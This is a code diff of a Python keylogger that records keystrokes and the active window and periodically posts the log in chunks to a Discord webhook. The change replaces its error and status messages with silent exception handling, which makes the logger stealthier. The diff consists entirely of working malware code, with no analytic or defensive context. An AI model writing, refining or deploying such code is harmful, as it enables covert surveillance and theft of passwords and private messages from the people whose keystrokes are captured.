@@ -32,8 +32,8 @@ def send_to_discord(message):
     try:
         payload = {"content": message}
         requests.post(DISCORD_WEBHOOK, json=payload)
-    except Exception as e:
-        print(f"[!] Failed to send to Discord: {e}")
+    except Exception:
+        pass
 
 def get_active_window():
     try:
@@ -73,21 +73,18 @@ def on_press(key):
         write_buffer_to_file()
 
 def send_logs():
+    """Send logs to Discord every interval."""
     while True:
         try:
             write_buffer_to_file()
             if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                 with open(LOG_FILE, "r", encoding="utf-8") as f:
                     data = f.read()
-
-                # Send in chunks (Discord limit ~2000 chars)
                 for i in range(0, len(data), 1900):
                     send_to_discord(data[i:i+1900])
-
-                open(LOG_FILE, "w").close()  # Clear log
-                print("[+] Sent logs to Discord")
-        except Exception as e:
-            print(f"[!] Send error: {e}")
+                open(LOG_FILE, "w").close()
+        except Exception:
+            pass
         time.sleep(SEND_INTERVAL)
 
 # ===========================
